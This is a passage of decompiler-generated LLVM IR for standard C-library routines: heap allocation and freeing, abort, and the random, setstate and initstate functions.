  %v2_12964 = sub i32 %v1_12964, %v0_12964
  %v1_12968 = add i32 %v2_12964, 12
  store i32 %v1_12968, i32* %r0.global-to-local, align 4
  %v1_1296c = load i32, i32* %r4.global-to-local, align 4
  %v2_1296c = inttoptr i32 %v1_1296c to i32*
  store i32 %v0_1296c, i32* %v2_1296c, align 4
  %v2_12970 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12970, i32* %r4.global-to-local, align 4
  ret i32 %v1_12968

dec_label_pc_12974:                               ; preds = %dec_label_pc_12918
  %v1_12974 = add i32 %v2_12930, 4
  %v2_12974 = inttoptr i32 %v1_12974 to i32*
  %v3_12974 = load i32, i32* %v2_12974, align 4
  store i32 %v3_12974, i32* %r0.global-to-local, align 4
  %v2_12978 = icmp eq i32 %v3_12974, 0
  br i1 %v2_12978, label %dec_label_pc_12978.dec_label_pc_12980_crit_edge, label %dec_label_pc_12918

dec_label_pc_12978.dec_label_pc_12980_crit_edge:  ; preds = %dec_label_pc_12974
  br label %dec_label_pc_12980

dec_label_pc_12980:                               ; preds = %dec_label_pc_12978.dec_label_pc_12980_crit_edge, %dec_label_pc_12978.preheader
  store i32 %v3_128f4, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_12974, { 1, 2, 0 }
  uselistorder i32 %v0_12948, { 1, 0 }
  uselistorder i32 %v2_12918, { 1, 0, 2, 3 }
  uselistorder i32 %v2_12930, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_1292c, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_12918, { 1, 0 }
  uselistorder label %dec_label_pc_12978.preheader, { 1, 0 }
}

define i32 @__heap_alloc_at(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_12988 = load i32, i32* %arg1, align 4
  store i32 %v2_12988, i32* %ip.global-to-local, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  %v2_12a006 = icmp eq i32 %v2_12988, 0
  br i1 %v2_12a006, label %dec_label_pc_12a08, label %dec_label_pc_12994

dec_label_pc_12994:                               ; preds = %entry, %dec_label_pc_129fc
  %v0_129d4 = phi i32 [ %v3_129fc, %dec_label_pc_129fc ], [ %v2_12988, %entry ]
  %v1_12994 = inttoptr i32 %v0_129d4 to i32*
  %v2_12994 = load i32, i32* %v1_12994, align 4
  store i32 %v2_12994, i32* %r0.global-to-local, align 4
  %v2_12998 = sub i32 %v0_129d4, %v2_12994
  %v1_1299c = add i32 %v2_12998, 12
  %v3_129a0 = icmp uge i32 %v1_1299c, %arg2
  %v9_129a0 = icmp eq i32 %v1_1299c, %arg2
  %v2_129a4 = xor i1 %v9_129a0, true
  %v3_129a4 = and i1 %v3_129a0, %v2_129a4
  br i1 %v3_129a4, label %dec_label_pc_129fc, label %dec_label_pc_129a8

dec_label_pc_129a8:                               ; preds = %dec_label_pc_12994
  br i1 %v9_129a0, label %dec_label_pc_129ac, label %dec_label_pc_12a08

dec_label_pc_129ac:                               ; preds = %dec_label_pc_129a8
  %v1_129ac = add i32 %arg3, 3
  %v1_129b0 = and i32 %v1_129ac, -4
  store i32 %v1_129b0, i32* %r2.global-to-local, align 4
  %v2_129b4 = sub i32 %v2_12994, %v1_129b0
  %v3_129b4 = icmp ult i32 %v2_12994, %v1_129b0
  br i1 %v3_129b4, label %dec_label_pc_12a08, label %dec_label_pc_129bc

dec_label_pc_129bc:                               ; preds = %dec_label_pc_129ac
  %v1_129bc = add i32 %v1_129b0, 44
  %v3_129c0 = icmp ult i32 %v2_12994, %v1_129bc
  br i1 %v3_129c0, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_129bc
  store i32 %v2_129b4, i32* %v1_12994, align 4
  %v1_129cc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_129cc, i32* %r0.global-to-local, align 4
  ret i32 %v1_129cc

.thread2:                                         ; preds = %dec_label_pc_129bc
  %v1_129d4 = add i32 %v0_129d4, 4
  %v2_129d4 = inttoptr i32 %v1_129d4 to i32*
  %v3_129d4 = load i32, i32* %v2_129d4, align 4
  store i32 %v3_129d4, i32* %r2.global-to-local, align 4
  %v2_129d8 = icmp eq i32 %v3_129d4, 0
  br i1 %v2_129d8, label %.thread3, label %bb17

bb17:                                             ; preds = %.thread2
  %v2_129dc = add i32 %v0_129d4, 8
  %v3_129dc = inttoptr i32 %v2_129dc to i32*
  %v4_129dc = load i32, i32* %v3_129dc, align 4
  %v3_129e0 = add i32 %v3_129d4, 8
  %v4_129e0 = inttoptr i32 %v3_129e0 to i32*
  store i32 %v4_129dc, i32* %v4_129e0, align 4
  %v0_129e4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread2, %bb17
  %v0_129e4 = phi i32 [ %v0_129d4, %.thread2 ], [ %v0_129e4.pre, %bb17 ]
  %v1_129e4 = add i32 %v0_129e4, 8
  %v2_129e4 = inttoptr i32 %v1_129e4 to i32*
  %v3_129e4 = load i32, i32* %v2_129e4, align 4
  store i32 %v3_129e4, i32* %r2.global-to-local, align 4
  %v1_129e8 = add i32 %v0_129e4, 4
  %v2_129e8 = inttoptr i32 %v1_129e8 to i32*
  %v3_129e8 = load i32, i32* %v2_129e8, align 4
  %v2_129ec = icmp eq i32 %v3_129e4, 0
  br i1 %v2_129ec, label %.thread4, label %bb18

bb18:                                             ; preds = %.thread3
  %v3_129f0 = add i32 %v3_129e4, 4
  %v4_129f0 = inttoptr i32 %v3_129f0 to i32*
  store i32 %v3_129e8, i32* %v4_129f0, align 4
  br label %bb19

.thread4:                                         ; preds = %.thread3
  %v2_129f4 = load i32, i32* %lr.global-to-local, align 4
  %v3_129f4 = inttoptr i32 %v2_129f4 to i32*
  store i32 %v3_129e8, i32* %v3_129f4, align 4
  br label %bb19

bb19:                                             ; preds = %bb18, %.thread4
  %v5_129f8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v5_129f8

dec_label_pc_129fc:                               ; preds = %dec_label_pc_12994
  %v1_129fc = add i32 %v0_129d4, 4
  %v2_129fc = inttoptr i32 %v1_129fc to i32*
  %v3_129fc = load i32, i32* %v2_129fc, align 4
  store i32 %v3_129fc, i32* %ip.global-to-local, align 4
  %v2_12a00 = icmp eq i32 %v3_129fc, 0
  br i1 %v2_12a00, label %dec_label_pc_12a00.dec_label_pc_12a08.loopexit_crit_edge, label %dec_label_pc_12994

dec_label_pc_12a00.dec_label_pc_12a08.loopexit_crit_edge: ; preds = %dec_label_pc_129fc
  br label %dec_label_pc_12a08

dec_label_pc_12a08:                               ; preds = %dec_label_pc_129ac, %entry, %dec_label_pc_12a00.dec_label_pc_12a08.loopexit_crit_edge, %dec_label_pc_129a8
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_129fc, { 1, 2, 0 }
  uselistorder i32 %v0_129e4, { 1, 0 }
  uselistorder i32 %v1_129b0, { 0, 2, 1, 3 }
  uselistorder i1 %v9_129a0, { 1, 0 }
  uselistorder i32 %v2_12994, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_129d4, { 3, 2, 1, 0, 5, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 0 }
  uselistorder label %dec_label_pc_12a08, { 2, 0, 3, 1 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_12994, { 1, 0 }
}

define i32 @__heap_link_free_area() local_unnamed_addr {
entry:
  %v0_12a10 = load i32, i32* @r2, align 4
  %v2_12a10 = icmp eq i32 %v0_12a10, 0
  %v0_12a14 = load i32, i32* @r3, align 4
  %v1_12a14 = load i32, i32* @r1, align 4
  %v2_12a14 = add i32 %v1_12a14, 4
  %v3_12a14 = inttoptr i32 %v2_12a14 to i32*
  store i32 %v0_12a14, i32* %v3_12a14, align 4
  %v0_12a18 = load i32, i32* @r2, align 4
  %v1_12a18 = load i32, i32* @r1, align 4
  %v2_12a18 = add i32 %v1_12a18, 8
  %v3_12a18 = inttoptr i32 %v2_12a18 to i32*
  store i32 %v0_12a18, i32* %v3_12a18, align 4
  %v1_12a20 = load i32, i32* @r1, align 4
  br i1 %v2_12a10, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v2_12a1c = load i32, i32* @r2, align 4
  %v3_12a1c = add i32 %v2_12a1c, 4
  %v4_12a1c = inttoptr i32 %v3_12a1c to i32*
  store i32 %v1_12a20, i32* %v4_12a1c, align 4
  br label %bb1

.thread:                                          ; preds = %entry
  %v2_12a20 = load i32, i32* @r0, align 4
  %v3_12a20 = inttoptr i32 %v2_12a20 to i32*
  store i32 %v1_12a20, i32* %v3_12a20, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_12a24 = load i32, i32* @r3, align 4
  %v2_12a24 = icmp eq i32 %v0_12a24, 0
  br i1 %v2_12a24, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_12a28 = load i32, i32* @r1, align 4
  %v3_12a28 = add i32 %v0_12a24, 8
  %v4_12a28 = inttoptr i32 %v3_12a28 to i32*
  store i32 %v1_12a28, i32* %v4_12a28, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_12a2c = load i32, i32* @r0, align 4
  ret i32 %v1_12a2c

; uselistorder directives
  uselistorder i32 %v1_12a20, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @__heap_link_free_area_after() local_unnamed_addr {
entry:
  %v0_12a30 = load i32, i32* @r2, align 4
  %v2_12a30 = icmp eq i32 %v0_12a30, 0
  %v1_12a34 = load i32, i32* @r1, align 4
  br i1 %v2_12a30, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_12a34 = load i32, i32* @r0, align 4
  %v3_12a34 = inttoptr i32 %v2_12a34 to i32*
  store i32 %v1_12a34, i32* %v3_12a34, align 4
  br label %bb2

.thread:                                          ; preds = %entry
  %v3_12a38 = add i32 %v0_12a30, 4
  %v4_12a38 = inttoptr i32 %v3_12a38 to i32*
  store i32 %v1_12a34, i32* %v4_12a38, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_12a3c = load i32, i32* @r2, align 4
  %v1_12a3c = load i32, i32* @r1, align 4
  %v2_12a3c = add i32 %v1_12a3c, 8
  %v3_12a3c = inttoptr i32 %v2_12a3c to i32*
  store i32 %v0_12a3c, i32* %v3_12a3c, align 4
  %v1_12a40 = load i32, i32* @r0, align 4
  ret i32 %v1_12a40

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_12a44 = load i32, i32* @r4, align 4
  store i32 %v3_12a44, i32* %stack_var_-20, align 4
  %v2_12a48 = load i32, i32* %arg1, align 4
  store i32 %v2_12a48, i32* %r4.global-to-local, align 4
  %v2_12a4c = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_12a682 = icmp eq i32 %v2_12a48, 0
  br i1 %v2_12a682, label %dec_label_pc_12b18, label %dec_label_pc_12a58

dec_label_pc_12a58:                               ; preds = %entry, %dec_label_pc_12a60
  %v0_12aa8 = phi i32 [ %v0_12ab0, %dec_label_pc_12a60 ], [ 0, %entry ]
  %v0_12ab0 = phi i32 [ %v3_12a64, %dec_label_pc_12a60 ], [ %v2_12a48, %entry ]
  %v1_12a6c5.in = phi i32 [ %v3_12a64, %dec_label_pc_12a60 ], [ %v2_12a48, %entry ]
  %v1_12a6c5 = add i32 %v1_12a6c5.in, 12
  %v3_12a58 = icmp ult i32 %v1_12a6c5, %arg2
  br i1 %v3_12a58, label %dec_label_pc_12a60, label %dec_label_pc_12a78

dec_label_pc_12a60:                               ; preds = %dec_label_pc_12a58
  store i32 %v0_12ab0, i32* %r6.global-to-local, align 4
  %v1_12a64 = add i32 %v0_12ab0, 4
  %v2_12a64 = inttoptr i32 %v1_12a64 to i32*
  %v3_12a64 = load i32, i32* %v2_12a64, align 4
  store i32 %v3_12a64, i32* %r4.global-to-local, align 4
  %v2_12a68 = icmp eq i32 %v3_12a64, 0
  br i1 %v2_12a68, label %dec_label_pc_12a68.dec_label_pc_12b18.loopexit_crit_edge, label %dec_label_pc_12a58

dec_label_pc_12a78:                               ; preds = %dec_label_pc_12a58
  %v1_12a78 = inttoptr i32 %v0_12ab0 to i32*
  %v2_12a78 = load i32, i32* %v1_12a78, align 4
  store i32 %v2_12a78, i32* @ip, align 4
  %v2_12a7c = sub i32 %v0_12ab0, %v2_12a78
  %v1_12a80 = add i32 %v2_12a7c, 12
  %v3_12a84 = icmp uge i32 %v1_12a80, %v2_12a4c
  %v9_12a84 = icmp eq i32 %v1_12a80, %v2_12a4c
  %v2_12a88 = xor i1 %v9_12a84, true
  %v3_12a88 = and i1 %v3_12a84, %v2_12a88
  br i1 %v3_12a88, label %dec_label_pc_12b18, label %dec_label_pc_12a8c

dec_label_pc_12a8c:                               ; preds = %dec_label_pc_12a78
  %v2_12a8c = add i32 %v2_12a78, %arg3
  store i32 %v2_12a8c, i32* %r7.global-to-local, align 4
  br i1 %v9_12a84, label %dec_label_pc_12a94, label %dec_label_pc_12ac0

dec_label_pc_12a94:                               ; preds = %dec_label_pc_12a8c
  %v2_12a94 = icmp eq i32 %v0_12aa8, 0
  br i1 %v2_12a94, label %dec_label_pc_12b0c, label %dec_label_pc_12a9c

dec_label_pc_12a9c:                               ; preds = %dec_label_pc_12a94
  %v1_12a9c = add i32 %v0_12aa8, 12
  %v9_12aa0 = icmp eq i32 %v1_12a9c, %arg2
  br i1 %v9_12aa0, label %dec_label_pc_12aa8, label %dec_label_pc_12b0c

dec_label_pc_12aa8:                               ; preds = %dec_label_pc_12a9c
  %v1_12aa8 = inttoptr i32 %v0_12aa8 to i32*
  %v2_12aa8 = load i32, i32* %v1_12aa8, align 4
  %v1_12aac = add i32 %v0_12aa8, 8
  %v2_12aac = inttoptr i32 %v1_12aac to i32*
  %v3_12aac = load i32, i32* %v2_12aac, align 4
  store i32 %v3_12aac, i32* @r2, align 4
  store i32 %v0_12ab0, i32* @r1, align 4
  %v2_12ab4 = add i32 %v2_12aa8, %v2_12a8c
  store i32 %v2_12ab4, i32* %r7.global-to-local, align 4
  %v0_12ab8 = call i32 @__heap_link_free_area_after()
  br label %dec_label_pc_12b0c

dec_label_pc_12ac0:                               ; preds = %dec_label_pc_12a8c
  %v1_12ac0 = add i32 %v0_12ab0, 4
  %v2_12ac0 = inttoptr i32 %v1_12ac0 to i32*
  %v3_12ac0 = load i32, i32* %v2_12ac0, align 4
  store i32 %v3_12ac0, i32* %r5.global-to-local, align 4
  %v2_12ac4 = icmp eq i32 %v3_12ac0, 0
  br i1 %v2_12ac4, label %dec_label_pc_12af8, label %dec_label_pc_12acc

dec_label_pc_12acc:                               ; preds = %dec_label_pc_12ac0
  %v1_12acc = inttoptr i32 %v3_12ac0 to i32*
  %v2_12acc = load i32, i32* %v1_12acc, align 4
  store i32 %v2_12acc, i32* @ip, align 4
  %v2_12ad0 = sub i32 %v3_12ac0, %v2_12acc
  %v1_12ad4 = add i32 %v2_12ad0, 12
  %v9_12ad8 = icmp eq i32 %v2_12a4c, %v1_12ad4
  br i1 %v9_12ad8, label %dec_label_pc_12ae0, label %dec_label_pc_12af8

dec_label_pc_12ae0:                               ; preds = %dec_label_pc_12acc
  store i32 %v0_12aa8, i32* @r2, align 4
  store i32 %v3_12ac0, i32* @r1, align 4
  %v2_12ae8 = add i32 %v2_12acc, %v2_12a8c
  store i32 %v2_12ae8, i32* %r7.global-to-local, align 4
  %v0_12aec = call i32 @__heap_link_free_area_after()
  %v0_12af0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12af0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12b0c

dec_label_pc_12af8:                               ; preds = %dec_label_pc_12acc, %dec_label_pc_12ac0
  %v2_12af8 = add i32 %v0_12ab0, %arg3
  store i32 %v2_12af8, i32* %r4.global-to-local, align 4
  store i32 %v3_12ac0, i32* @r3, align 4
  store i32 %v0_12aa8, i32* @r2, align 4
  store i32 %v2_12af8, i32* @r1, align 4
  %v0_12b08 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_12b0c

dec_label_pc_12b0c:                               ; preds = %dec_label_pc_12a9c, %dec_label_pc_12a94, %dec_label_pc_12ae0, %dec_label_pc_12aa8, %dec_label_pc_12af8
  %v0_12b0c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12b0c, i32* %r5.global-to-local, align 4
  %v0_12b10 = load i32, i32* %r7.global-to-local, align 4
  %v2_12b10 = inttoptr i32 %v0_12b0c to i32*
  store i32 %v0_12b10, i32* %v2_12b10, align 4
  br label %dec_label_pc_12b30

dec_label_pc_12a68.dec_label_pc_12b18.loopexit_crit_edge: ; preds = %dec_label_pc_12a60
  br label %dec_label_pc_12b18

dec_label_pc_12b18:                               ; preds = %entry, %dec_label_pc_12a68.dec_label_pc_12b18.loopexit_crit_edge, %dec_label_pc_12a78
  %v1_12b18 = add i32 %v2_12a4c, -12
  store i32 %v1_12b18, i32* %r5.global-to-local, align 4
  %v3_12b1c = inttoptr i32 %v1_12b18 to i32*
  store i32 %arg3, i32* %v3_12b1c, align 4
  %v0_12b20 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12b20, i32* @r3, align 4
  %v0_12b24 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_12b24, i32* @r2, align 4
  %v0_12b28 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12b28, i32* @r1, align 4
  %v0_12b2c = call i32 @__heap_link_free_area()
  br label %dec_label_pc_12b30

dec_label_pc_12b30:                               ; preds = %dec_label_pc_12b0c, %dec_label_pc_12b18
  %v0_12b30 = load i32, i32* %r5.global-to-local, align 4
  %v2_12b34 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12b34, i32* @r4, align 4
  ret i32 %v0_12b30

; uselistorder directives
  uselistorder i32 %v3_12ac0, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_12a84, { 1, 0 }
  uselistorder i32 %v3_12a64, { 2, 3, 1, 0 }
  uselistorder i32 %v0_12ab0, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_12aa8, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 ()* @__heap_link_free_area, { 1, 0 }
  uselistorder i32 ()* @__heap_link_free_area_after, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12b30, { 1, 0 }
  uselistorder label %dec_label_pc_12b18, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12b0c, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_12a58, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
dec_label_pc_12b54.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_12b38 = ptrtoint i32* %stack_var_-268 to i32
  %v1_12b48 = call i32 @__pthread_return_0()
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_12b54 = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_12b54

dec_label_pc_12b54:                               ; preds = %dec_label_pc_12b54.lr.ph, %dec_label_pc_12b54
  %v1_12b58 = phi i32 [ 31, %dec_label_pc_12b54.lr.ph ], [ %v1_12b64, %dec_label_pc_12b54 ]
  %v4_12b58 = mul i32 %v1_12b58, 4
  %v5_12b58 = add i32 %v4_12b58, %v2_12b54
  %v2_12b60 = add i32 %v5_12b58, -128
  %v3_12b60 = inttoptr i32 %v2_12b60 to i32*
  store i32 0, i32* %v3_12b60, align 4
  %v0_12b64 = load i32, i32* %r1.global-to-local, align 4
  %v1_12b64 = add i32 %v0_12b64, -1
  store i32 %v1_12b64, i32* %r1.global-to-local, align 4
  %v6_12b64 = icmp slt i32 %v1_12b64, 0
  br i1 %v6_12b64, label %dec_label_pc_12b6c, label %dec_label_pc_12b54

dec_label_pc_12b6c:                               ; preds = %dec_label_pc_12b54
  %v2_12b6c = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_12b6c, i32* @r4, align 4
  store i32 %v2_12b6c, i32* @r0, align 4
  store i32 6, i32* @r1, align 4
  %v0_12b78 = call i32 @__sigaddset()
  %v2_12b7c = icmp eq i32 %v0_12b78, 0
  br i1 %v2_12b7c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_12b6c
  store i32 %v2_12b6c, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_12b6c, %bb
  store i32 76688, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12b7c, i32 ptrtoint (i32* @global_var_f9d8.466 to i32))
  %v2_12b94 = load i32, i32* @global_var_28a9c.468, align 4
  %v2_12b98 = icmp eq i32 %v2_12b94, 0
  br i1 %v2_12b98, label %dec_label_pc_12ba0, label %dec_label_pc_12bd0

dec_label_pc_12ba0:                               ; preds = %.thread1
  store i32 1, i32* @global_var_28a9c.468, align 4
  br label %dec_label_pc_12ba8

dec_label_pc_12ba8:                               ; preds = %dec_label_pc_12c20, %dec_label_pc_12ba0
  store i32 76728, i32* @lr, align 4
  %v1_12bb4 = call i32 @__pthread_return_0()
  %v1_12bbc = call i32 @__raise(i32 6)
  store i32 76752, i32* @lr, align 4
  %v1_12bcc = call i32 @__pthread_return_0()
  %v2_12bd4.pre = load i32, i32* @global_var_28a9c.468, align 4
  br label %dec_label_pc_12bd0

dec_label_pc_12bd0:                               ; preds = %.thread1, %dec_label_pc_12ba8
  %v0_12c44 = phi i32 [ %v2_12b94, %.thread1 ], [ %v2_12bd4.pre, %dec_label_pc_12ba8 ]
  store i32 ptrtoint (i32* @global_var_28a9c.468 to i32), i32* %ip.global-to-local, align 4
  %v7_12bd8 = icmp eq i32 %v0_12c44, 1
  br i1 %v7_12bd8, label %dec_label_pc_12c08.lr.ph, label %dec_label_pc_12c3c

dec_label_pc_12c08.lr.ph:                         ; preds = %dec_label_pc_12bd0
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_28a9c.468, align 4
  %v2_12bf4 = bitcast i32* %stack_var_-268 to i8*
  %v3_12bf4 = call i32 @__GI_memset(i8* %v2_12bf4, i32 0)
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12c08

dec_label_pc_12c08:                               ; preds = %dec_label_pc_12c08.lr.ph, %dec_label_pc_12c08
  %v1_12c0c = phi i32 [ 31, %dec_label_pc_12c08.lr.ph ], [ %v1_12c18, %dec_label_pc_12c08 ]
  %v4_12c0c = mul i32 %v1_12c0c, 4
  %v5_12c0c = add i32 %v4_12c0c, %v2_12b54
  %v2_12c14 = add i32 %v5_12c0c, -264
  %v3_12c14 = inttoptr i32 %v2_12c14 to i32*
  store i32 -1, i32* %v3_12c14, align 4
  %v0_12c18 = load i32, i32* %r1.global-to-local, align 4
  %v1_12c18 = add i32 %v0_12c18, -1
  store i32 %v1_12c18, i32* %r1.global-to-local, align 4
  %v6_12c18 = icmp slt i32 %v1_12c18, 0
  br i1 %v6_12c18, label %dec_label_pc_12c20, label %dec_label_pc_12c08

dec_label_pc_12c20:                               ; preds = %dec_label_pc_12c08
  store i32 %v2_12b38, i32* %r1.global-to-local, align 4
  %v4_12c34 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_12ba8

dec_label_pc_12c3c:                               ; preds = %dec_label_pc_12bd0
  %v7_12c3c = icmp eq i32 %v0_12c44, 2
  br i1 %v7_12c3c, label %dec_label_pc_12c44, label %dec_label_pc_12c50

dec_label_pc_12c44:                               ; preds = %dec_label_pc_12c3c
  store i32 3, i32* @global_var_28a9c.468, align 4
  %v0_12c4c = call i32 @abort()
  %v2_12c50.pre = load i32, i32* @global_var_28a9c.468, align 4
  br label %dec_label_pc_12c50

dec_label_pc_12c50:                               ; preds = %dec_label_pc_12c3c, %dec_label_pc_12c44
  %v1_12c58 = phi i32 [ %v0_12c44, %dec_label_pc_12c3c ], [ %v2_12c50.pre, %dec_label_pc_12c44 ]
  %v7_12c54 = icmp eq i32 %v1_12c58, 3
  br i1 %v7_12c54, label %bb27, label %.thread3

bb27:                                             ; preds = %dec_label_pc_12c50
  %v2_12c60 = load i32, i32* %ip.global-to-local, align 4
  %v3_12c60 = inttoptr i32 %v2_12c60 to i32*
  store i32 4, i32* %v3_12c60, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_12c50, %bb27
  call void @__pseudo_cond_branch(i1 %v7_12c54, i32 ptrtoint (i32* @global_var_f5c4.470 to i32))
  br label %dec_label_pc_12c68

dec_label_pc_12c68:                               ; preds = %dec_label_pc_12c68, %.thread3
  %v0_12c68 = call i32 @abort()
  br label %dec_label_pc_12c68

; uselistorder directives
  uselistorder i32 %v1_12c18, { 2, 1, 0 }
  uselistorder i32 %v1_12b64, { 2, 1, 0 }
  uselistorder i32* %stack_var_-268, { 1, 2, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 8, 3, 0, 1, 4, 5, 7, 6, 2 }
  uselistorder i32* @global_var_28a9c.468, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_12c50, { 1, 0 }
  uselistorder label %dec_label_pc_12c08, { 1, 0 }
  uselistorder label %dec_label_pc_12bd0, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_12b54, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_12c80 = call i32 @random()
  ret i32 %v0_12c80

; uselistorder directives
  uselistorder i32 ()* @random, { 11, 5, 4, 10, 9, 7, 6, 2, 1, 0, 3, 8 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_12c84 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_22750.472 to i32), i32* @r4, align 4
  %v2_12c8c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_12c8c, i32* @r0, align 4
  %v1_12ca4 = call i32 @__pthread_return_void()
  %v1_12cb4 = call i32 @__pthread_return_0()
  %v2_12cb8 = ptrtoint i32* %stack_var_-16 to i32
  %v3_12cc0 = call i32 @__GI_random_r(i32* inttoptr (i32 141160 to i32*), i32 %v2_12cb8)
  store i32 %v2_12c8c, i32* @r0, align 4
  store i32 77016, i32* @lr, align 4
  %v1_12cd4 = call i32 @__pthread_return_void()
  %v3_12cd8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_12c84, i32* @r4, align 4
  ret i32 %v3_12cd8
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v2_12d04 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_12d04, i32* @r0, align 4
  %v1_12d20 = call i32 @__pthread_return_void()
  %v1_12d30 = call i32 @__pthread_return_0()
  %v3_12d40 = load i32, i32* bitcast (i32** @global_var_22770.485 to i32*), align 4
  store i32 %v3_12d40, i32* @r4, align 4
  %v3_12d44 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_22768)
  %v1_12d4c = icmp slt i32 %v3_12d44, 0
  store i32 %v2_12d04, i32* @r0, align 4
  %. = select i1 %v1_12d4c, i32 0, i32 ptrtoint (i32** @global_var_2276c.487 to i32)
  %v1_12d64 = call i32 @__pthread_return_void()
  ret i32 %.
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_12d94 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %v2_12d94, i32* @r0, align 4
  %v1_12db8 = call i32 @__pthread_return_void()
  %v1_12dc8 = call i32 @__pthread_return_0()
  %v0_12dd0 = load i32, i32* @r5, align 4
